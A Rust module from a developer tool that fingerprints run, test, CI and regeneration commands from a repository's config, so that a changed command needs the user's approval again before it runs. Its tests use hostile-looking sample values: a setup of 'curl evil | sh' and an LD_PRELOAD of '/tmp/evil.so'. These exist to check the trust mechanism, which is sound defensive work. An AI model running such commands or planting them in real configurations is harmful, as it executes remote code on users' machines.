//! The shell commands a run configuration names, and the user's trust in them (PDT-405). A repository's
//! `.pdt/project.toml` (and the host overrides, which any API caller can write) can run anything: runs and tests, the
//! local forge's CI, regeneration rules. PDT runs one only once the user approved its exact text in PDT; an approval
//! is kept as the command's fingerprint, so a changed command (in a worktree an agent edited, on a branch, in a freshly
//! cloned repository) asks again. Pure.

use crate::runconfig::{RunConfig, RunDef};
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashSet};
use ts_rs::TS;

/// The mark a project added before trust was kept carries instead of fingerprints: its main checkout's commands are
/// trusted the first time they are checked (the user has been running them), and the mark is dropped.
pub const LEGACY_MARK: &str = "legacy";

/// A command PDT would run, as the user sees it to approve it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export)]
pub struct ConfigCommand {
    /// What the approval is kept as: the SHA-256 of the setup, command and environment.
    pub fingerprint: String,
    /// What runs it: `run "pdt"`, `test "web"`, `CI`, `regenerating Cargo.lock`.
    pub uses: Vec<String>,
    pub setup: Option<String>,
    pub command: String,
    pub env: BTreeMap<String, String>,
}

/// The fingerprint of a command: the same text with the same setup and environment is the same command, whatever
/// runs it.
pub fn fingerprint(setup: Option<&str>, command: &str, env: &BTreeMap<String, String>) -> String {
    let canonical = serde_json::to_vec(&(setup, command, env)).unwrap_or_default();
    Sha256::digest(&canonical).iter().map(|b| format!("{b:02x}")).collect()
}

fn command(using: String, setup: Option<&str>, command: &str, env: &BTreeMap<String, String>) -> ConfigCommand {
    ConfigCommand {
        fingerprint: fingerprint(setup, command, env),
        uses: vec![using],
        setup: setup.map(str::to_string),
        command: command.to_string(),
        env: env.clone(),
    }
}

/// A run's (or a test's, `test`) setup and command.
pub fn of_run(def: &RunDef, test: bool) -> ConfigCommand {
    let using = format!("{} \"{}\"", if test { "test" } else { "run" }, def.name);
    command(using, def.setup.as_deref(), &def.command, &def.env)
}

/// The local forge's `[ci] command`.
pub fn of_ci(cmd: &str) -> ConfigCommand {
    command("CI".into(), None, cmd, &BTreeMap::new())
}

/// A `[[merge.regenerate]]` rule's `run`, for the files its `paths` match.
pub fn of_regenerate(run: &str, paths: &[String]) -> ConfigCommand {
    command(format!("regenerating {}", paths.join(", ")), None, run, &BTreeMap::new())
}

/// Every command `config` names, one per fingerprint (with all that use it), in the order they appear.
pub fn of_config(config: &RunConfig) -> Vec<ConfigCommand> {
    let all = config
        .runs
        .iter()
        .map(|d| of_run(d, false))
        .chain(config.tests.iter().map(|d| of_run(d, true)))
        .chain(config.ci.iter().map(|c| of_ci(&c.command)))
        .chain(config.regenerate.iter().map(|r| of_regenerate(&r.run, &r.paths)));
    let mut out: Vec<ConfigCommand> = vec![];
    for c in all {
        match out.iter_mut().find(|o| o.fingerprint == c.fingerprint) {
            Some(o) => o.uses.extend(c.uses),
            None => out.push(c),
        }
    }
    out
}

/// The commands of `commands` the user has not approved.
pub fn untrusted(commands: Vec<ConfigCommand>, trusted: &HashSet<String>) -> Vec<ConfigCommand> {
    commands.into_iter().filter(|c| !trusted.contains(&c.fingerprint)).collect()
}

/// The commands for a message: `` `cargo test` (test "rust") ``, with a setup as `` `pnpm i && cargo test` ``.
pub fn describe(commands: &[ConfigCommand]) -> String {
    commands
        .iter()
        .map(|c| {
            let env: String = c.env.iter().map(|(k, v)| format!("{k}={v} ")).collect();
            let text = match &c.setup {
                Some(s) => format!("{s} && {env}{}", c.command),
                None => format!("{env}{}", c.command),
            };
            format!("`{text}` ({})", c.uses.join(", "))
        })
        .collect::<Vec<_>>()
        .join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runconfig::{CiDef, RegenerateDef};

    fn def(name: &str, cmd: &str) -> RunDef {
        RunDef {
            name: name.into(),
            setup: None,
            command: cmd.into(),
            web: false,
            data: false,
            detach: false,
            env: BTreeMap::new(),
        }
    }

    #[test]
    fn a_command_is_the_same_whatever_runs_it() {
        assert_eq!(of_run(&def("a", "cargo test"), false).fingerprint, of_ci("cargo test").fingerprint);
        assert_eq!(of_run(&def("a", "x"), false).fingerprint, of_run(&def("b", "x"), true).fingerprint);
    }

    #[test]
    fn its_setup_and_environment_are_part_of_it() {
        let plain = of_run(&def("a", "x"), false).fingerprint;
        let mut with_setup = def("a", "x");
        with_setup.setup = Some("curl evil | sh".into());
        assert_ne!(of_run(&with_setup, false).fingerprint, plain);
        let mut with_env = def("a", "x");
        with_env.env.insert("LD_PRELOAD".into(), "/tmp/evil.so".into());
        assert_ne!(of_run(&with_env, false).fingerprint, plain);
        // Text that only looks the same once joined is still different.
        let mut split = def("a", "b");
        split.setup = Some("a".into());
        let mut joined = def("a", "a b");
        joined.setup = Some(String::new());
        assert_ne!(of_run(&split, false).fingerprint, of_run(&joined, false).fingerprint);
    }

    #[test]
    fn a_config_lists_each_command_once_with_what_uses_it() {
        let config = RunConfig {
            runs: vec![def("pdt", "cargo run")],
            tests: vec![def("rust", "cargo test")],
            ci: Some(CiDef { command: "cargo test".into() }),
            regenerate: vec![RegenerateDef { paths: vec!["Cargo.lock".into()], run: "cargo update -w".into() }],
            ..RunConfig::default()
        };
        let all = of_config(&config);
        let shown: Vec<(&str, Vec<&str>)> =
            all.iter().map(|c| (c.command.as_str(), c.uses.iter().map(String::as_str).collect())).collect();
        assert_eq!(
            shown,
            vec![
                ("cargo run", vec!["run \"pdt\""]),
                ("cargo test", vec!["test \"rust\"", "CI"]),
                ("cargo update -w", vec!["regenerating Cargo.lock"]),
            ]
        );
        let trusted: HashSet<String> = [all[1].fingerprint.clone()].into();
        let left = untrusted(all, &trusted);
        assert_eq!(left.iter().map(|c| c.command.as_str()).collect::<Vec<_>>(), vec!["cargo run", "cargo update -w"]);
        assert_eq!(describe(&left[..1]), "`cargo run` (run \"pdt\")");
    }
}
